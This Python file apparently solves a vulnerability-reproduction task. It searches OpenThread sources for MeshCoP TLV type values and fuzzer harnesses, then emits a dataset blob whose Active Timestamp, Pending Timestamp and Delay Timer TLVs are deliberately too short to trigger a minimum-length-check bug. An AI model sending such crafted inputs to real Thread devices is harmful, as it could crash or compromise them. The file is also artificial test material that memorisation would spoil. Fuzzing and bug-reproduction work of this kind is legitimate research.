import os
import re
import tarfile
from typing import Dict, Iterable, List, Optional, Tuple


class Solution:
    def _iter_text_files(self, src_path: str) -> Iterable[Tuple[str, str]]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
        name_keywords = ("dataset", "meshcop", "tlv", "fuzz", "fuzzer", "openthread", "thread", "coap", "mgmt")
        max_bytes = 512 * 1024

        def should_consider(name: str) -> bool:
            nl = name.lower()
            if not nl.endswith(exts):
                return False
            return any(k in nl for k in name_keywords)

        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not fn.lower().endswith(exts):
                        continue
                    full = os.path.join(root, fn)
                    if not should_consider(full):
                        continue
                    try:
                        st = os.stat(full)
                        if st.st_size <= 0:
                            continue
                        with open(full, "rb") as f:
                            data = f.read(min(st.st_size, max_bytes))
                        yield full, data.decode("utf-8", errors="ignore")
                    except Exception:
                        continue
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name
                        if not should_consider(name):
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read(min(m.size, max_bytes))
                            yield name, data.decode("utf-8", errors="ignore")
                        except Exception:
                            continue
            except Exception:
                return

    def _parse_int(self, s: str) -> Optional[int]:
        s = s.strip()
        try:
            if s.lower().startswith("0x"):
                return int(s, 16)
            return int(s, 10)
        except Exception:
            return None

    def _extract_tlv_types(self, src_path: str) -> Dict[str, int]:
        wanted = {
            "kChannel": None,
            "kPanId": None,
            "kExtendedPanId": None,
            "kNetworkName": None,
            "kPskc": None,
            "kNetworkKey": None,
            "kMeshLocalPrefix": None,
            "kSecurityPolicy": None,
            "kActiveTimestamp": None,
            "kPendingTimestamp": None,
            "kDelayTimer": None,
        }

        patterns = [
            re.compile(r"\b(kChannel|kPanId|kExtendedPanId|kNetworkName|kPskc|kNetworkKey|kMeshLocalPrefix|kSecurityPolicy|kActiveTimestamp|kPendingTimestamp|kDelayTimer)\b\s*=\s*(0x[0-9a-fA-F]+|\d+)")
        ]

        for _, txt in self._iter_text_files(src_path):
            if "kActiveTimestamp" not in txt and "ActiveTimestamp" not in txt and "kPendingTimestamp" not in txt and "DelayTimer" not in txt and "kNetworkKey" not in txt:
                continue
            for pat in patterns:
                for m in pat.finditer(txt):
                    key = m.group(1)
                    val = self._parse_int(m.group(2))
                    if val is None:
                        continue
                    if 0 <= val <= 255 and key in wanted and wanted[key] is None:
                        wanted[key] = val
            if all(v is not None for v in wanted.values()):
                break

        res: Dict[str, int] = {}
        for k, v in wanted.items():
            if v is not None:
                res[k] = v
        return res

    def _detect_fuzzer_usage(self, src_path: str) -> Tuple[bool, bool]:
        uses_active = False
        uses_pending = False

        for _, txt in self._iter_text_files(src_path):
            if "LLVMFuzzerTestOneInput" not in txt:
                continue
            if ("otDatasetSetActiveTlvs" in txt) or ("SendMgmtActiveSet" in txt) or ("MgmtActiveSet" in txt) or ("SetActiveTlvs" in txt):
                uses_active = True
            if ("otDatasetSetPendingTlvs" in txt) or ("SendMgmtPendingSet" in txt) or ("MgmtPendingSet" in txt) or ("SetPendingTlvs" in txt):
                uses_pending = True
            if uses_active and uses_pending:
                break

        if not uses_active and not uses_pending:
            for _, txt in self._iter_text_files(src_path):
                if "Dataset" not in txt and "dataset" not in txt:
                    continue
                if ("SetActive" in txt) or ("ActiveDataset" in txt) or ("ActiveTlvs" in txt):
                    uses_active = True
                if ("SetPending" in txt) or ("PendingDataset" in txt) or ("PendingTlvs" in txt) or ("DelayTimer" in txt):
                    uses_pending = True
                if uses_active and uses_pending:
                    break

        if not uses_active and not uses_pending:
            uses_active = True
            uses_pending = True

        return uses_active, uses_pending

    def _tlv(self, t: int, value: bytes) -> bytes:
        t &= 0xFF
        ln = len(value) & 0xFF
        return bytes((t, ln)) + value

    def solve(self, src_path: str) -> bytes:
        types = self._extract_tlv_types(src_path)
        uses_active, uses_pending = self._detect_fuzzer_usage(src_path)

        # Thread MeshCoP TLV type fallbacks (common OpenThread values)
        kChannel = types.get("kChannel", 0)
        kPanId = types.get("kPanId", 1)
        kExtendedPanId = types.get("kExtendedPanId", 2)
        kNetworkName = types.get("kNetworkName", 3)
        kPskc = types.get("kPskc", 4)
        kNetworkKey = types.get("kNetworkKey", 5)
        kMeshLocalPrefix = types.get("kMeshLocalPrefix", 7)
        kSecurityPolicy = types.get("kSecurityPolicy", 12)
        kActiveTimestamp = types.get("kActiveTimestamp", 14)
        kPendingTimestamp = types.get("kPendingTimestamp", 51)
        kDelayTimer = types.get("kDelayTimer", 52)

        # Build a plausible operational dataset TLV set and include invalid TLVs
        # for the vulnerable minimum-length checks (length < required).
        out = bytearray()

        # Channel TLV: [page=0][channel=11]
        out += self._tlv(kChannel, bytes((0x00, 0x00, 0x0B)))
        # PAN ID TLV: 0x1234
        out += self._tlv(kPanId, bytes((0x12, 0x34)))
        # Extended PAN ID TLV: 8 bytes
        out += self._tlv(kExtendedPanId, bytes((1, 2, 3, 4, 5, 6, 7, 8)))
        # Network Name TLV: "a"
        out += self._tlv(kNetworkName, b"a")
        # PSKc TLV: 16 bytes
        out += self._tlv(kPskc, b"B" * 16)
        # Network Key TLV: 16 bytes
        out += self._tlv(kNetworkKey, b"C" * 16)
        # Mesh Local Prefix TLV: 8 bytes (/64)
        out += self._tlv(kMeshLocalPrefix, bytes((0xFD, 0x00, 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00)))
        # Security Policy TLV: 3 bytes (rotation time + flags) (values arbitrary but sized correctly)
        out += self._tlv(kSecurityPolicy, bytes((0x00, 0x10, 0x01)))

        # Invalid minimum lengths:
        # Active Timestamp should be 8 bytes; use 1.
        if uses_active or uses_pending:
            out += bytes((kActiveTimestamp & 0xFF, 0x01, 0x00))

        # Pending dataset fields
        if uses_pending:
            # Pending Timestamp should be 8 bytes; use 1.
            out += bytes((kPendingTimestamp & 0xFF, 0x01, 0x00))
            # Delay Timer should be 4 bytes; use 1.
            out += bytes((kDelayTimer & 0xFF, 0x01, 0x00))

        return bytes(out)